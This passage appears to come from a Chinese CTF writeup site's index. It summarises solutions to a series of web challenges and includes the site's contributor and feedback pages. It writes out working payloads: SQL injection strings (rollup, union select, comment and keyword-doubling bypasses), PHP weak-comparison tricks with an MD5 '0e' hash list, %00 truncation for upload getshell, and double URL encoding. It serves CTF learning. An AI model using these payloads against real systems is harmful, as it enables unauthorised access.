''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; echo ''.\"\"; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1){ print \"水可载舟，亦可赛艇！\"; exit(); } } $filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"; foreach($_POST as $key=>$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\"); if (!$con){ die('Could not connect: ' . mysql_error()); } $db=\"XXXXXX\"; mysql_select_db($db, $con); $sql=\"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'\"; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) { print \"CTF{XXXXXX}\"; }else{ print \"亦可赛艇！\"; } }else{ print \"一颗赛艇！\"; } mysql_close($con); ?> 阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。 mysql> create table test ( -> user varchar(100) not null, -> pwd varchar(100) not null);mysql>insert into test values(\"admin\",\"mypass\");mysql>select from test group by pwd with rollupmysql> select from test group by pwd with rollup;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass || admin | mypass || admin | NULL |+-------+------------+3 rows in setmysql> select from test group by pwd with rollup limit 1;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+mysql> select from test group by pwd with rollup limit 1 offset 0;+-------+------------+| user | pwd |+-------+------------+| guest | alsomypass |+-------+------------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 1;+-------+--------+| user | pwd |+-------+--------+| admin | mypass |+-------+--------+1 row in setmysql> select from test group by pwd with rollup limit 1 offset 2;+-------+------+| user | pwd |+-------+------+| admin | NULL |+-------+------+1 row in set 构造payload:uname=1' or true group by pwd with rollup limit 1 offset 2#&pwd=offset 2为偏移两个数据，即第三行的pwd字段为空。 0x09 简单的sql注入之3 简单概括： 考点：mysql报错注入 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7846917.html 解题过程： exp函数报错一把嗦 0x0A 简单的sql注入之2 简单概括： 考点：空格过滤 难度：易 WP：https://www.cnblogs.com/caizhiren/p/7862466.html 解题过程： 简单Fuzz发现过滤了空格，使用内敛注释一把嗦。 /**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database() 0x0B 简单的sql注入之1 简单概括： 考点：双层叠加绕过 难度：易 WP：https://www.jianshu.com/p/5d37d33854e3 解题过程 selectselect 0x0C 天下武功唯快不破 简单概括： 考点：脚本工具的编写 难度：易 WP：无 解题过程： import requests,base64 r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php') key=base64.b64decode(r.headers['FLAG'])[-9:] r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key}) print(r.text) 0x0D 让我进去 简单概括： 考点：hash长度拓展攻击 难度：难 WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/ 0x0E 拐弯抹角 简单概括： 考点：index.php/index.php 难度：易 WP：无 解题过程： index.php/index.php 0X0F Forms 简单概括： 考点：不清楚，过于简单 难度：无 WP：无 0x10 天网管理系统 简单概括： 考点：PHP==弱类型比较，PHP序列化与反序列化 难度：易 WP：http://www.cnblogs.com/ssooking/p/5877086.html 解题过程： 右键查看源代码发现部分源码 ：我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x11 忘记密码了 简单概括： 考点：vim源码泄露 难度：中 WP：.submit.php.swp 解题过程： 打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。 ........这一行是省略的代码........ /* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- -- 表的结构 `user` -- CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ; -- -- 转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */ ........这一行是省略的代码........ if(!empty($token)&&!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r>0){ echo $flag; }else{ echo \"失败了呀\"; } } payload: token=0e11111111&emailAddress=admin@simplexue.com 0x12 Once More 简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程： 打开题目，得到题目源码： You password must be alphanumeric'; } else if (strlen($_GET['password']) 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('*-* have not been found'); } } else { echo 'Invalid password'; } } ?> 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session 简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程： 打开题目得到源码： Wrong guess.'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?> 创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION['password']的值将为NULL，此时如果我们get传入的 password为空，即''，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE 简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&password[]=2 解题过程： 打开题目获得源码： Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.'; } else{ echo 'Login first!'; ?> 我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&password[]=b 0x15 上传绕过 简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程： burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200 简单概括： 考点：逆加密过程 难度：易 WP：部分： x = \"~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg\" c = \"\" for a in x: b = ord(a) c += chr(b-1) print(c) 解题过程： 打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题 简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&pass=1 解题过程： 打开题目，右键查看源代码得到题目源码： welcome to simplexue connect_error) { die(\"Connection failed: \" . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\"pw\"]; if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) { echo \"Logged in! Key:************** \"; } else { echo(\"Log in failure!\"); } } ?> strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd: user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西? 简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程： 复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法 简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程： 打开题目，页面提示：index.php.txt，打开得到源码： not allowed!\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"Access granted!\"; echo \"flag: *****************} \"; } ?> Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单! 简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难 简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大 简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠 简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程： 查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难 简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-03 01:05:06 0 issues reported "},"help.html":{"url":"help.html","title":"加入我们完善网站!","keywords":"","body":"帮助我们     我们诚邀各位热爱CTF的师傅一起不断完善此站点，致力于建成一个完整的CTF题库。    犹记得刚接触CTF时，被一个简单的题目卡了半天，百度找到的答案全都是复制粘贴的垃圾答案。相信很多人都应该与我一样遇到这种事。带着为避免让后来者重走我们的坑的希望，我创建了此站点，但我深知，我一人的力量是远远不足的，在此我诚挚地邀请您加入此项目，在这里你是自由的，没有硬性指标，让我们一起为之一起奋斗吧。    注：本站点纯公益，对本站有贡献的小伙伴将会在首页被公开致谢。 目前可做的事： 目前大家可以做的事情有： 提交写好的Writeup 提出利于网站建设的建议 负责网站的管理与维护 关于提交WP:     为方便站点维护和管理，提交的wp应该遵循以下条件： 内容     为确定站点WP的质量，每个提交的Writeup均需要经过审核组的审核。    对于提交的内容审核组有权进行相应的修改或添加。 模板     首先，我们的Writeup需要按照markdown语法来书写。Markdown教程    其次，md文件 应按照以下格式： # 20xxxxx 如2019DDCTF滴滴高校赛 ## 题目类型： |类型|年份|难度| |:---:|:---:|:---:| |xxx|20xx|xx| # 题目下载: + xxx(百度网盘|Github) # 网上公开WP： + xxx + xxx + xxx + xxx # 本站备份WP： --- writeup~ --- # 评论区     注意排面干净整洁，禁止引入非图片的外部资源，如js，css等。    Demo：2019DDCTF 命名     md文件的命名应遵循以下原则：    年份+名称.md，如：2019ddctf.md 版权     搜集的文章必须无版权争议，原作者禁止转载的WP拒收，在每种类型的题目WP之前应先感谢原作者，原公开WP的链接要保留放在公开WP区域内。 提交地址 加入官方QQ群937886410，提交给审核组即可。 关于提交建议 内容     提交的建议必须具有建设性。 提交地址 邮箱：asp-php@foxmail.com 关于管理维护 要求 有责任心 删除垃圾评论 能够时不时确定网站情况 能够处理突发事件，如：coding page服务中断，更换github page服务。 提交地址 邮箱：asp-php@foxmail.com，注明申请管理。 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-20 21:58:39 0 issues reported "},"reply.html":{"url":"reply.html","title":"有问题?请在这里反馈!","keywords":"","body":"请在这里留下你的宝贵建议 官方互助群 快来加群一起讨(gao)论(ji)啊。 点我加群 :)群号: 937886410 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-04-28 01:52:48 0 issues reported "}}